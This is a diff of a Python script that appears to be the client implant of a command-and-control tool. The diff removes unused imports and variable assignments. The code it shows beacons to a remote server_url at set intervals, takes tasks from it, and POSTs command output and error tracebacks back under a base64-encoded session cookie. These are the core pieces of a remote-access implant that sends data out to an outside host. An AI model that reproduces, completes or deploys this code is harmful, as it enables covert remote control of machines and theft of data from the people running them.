@@ -1,11 +1,8 @@
 import os
 import requests
 import time
-import random
-import string
 import base64
 import platform
-import pdb
 import json
 import subprocess
 import sys
@@ -36,7 +33,6 @@ def staging(identifier):
 
 ## Send out beacons for 60secs at 5secs interval
 def beacon(identifier):
-	start_time = time.time()
 	url = f"http://{server_url}"
 
 	while True:
@@ -106,7 +102,7 @@ def handle_commands(response, identifier):
 			url = f"http://{server_url}/{res['command']}/output/{res['task_id']}"
 			cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 
-			r = requests.post(url = url,cookies = cookies, data = command_output)
+			requests.post(url = url,cookies = cookies, data = command_output)
 		else:
 			## Some error happened while exexuting task, send some othe response code? TODO
 			pass
@@ -118,7 +114,7 @@ def handle_commands(response, identifier):
 		## Some error happened while handling commands, sent the traceback to server back
 		url = f"http://{server_url}/clienterror"
 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
-		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())
+		requests.post(url = url,cookies = cookies, data = traceback.format_exc())
 
 def main():
 
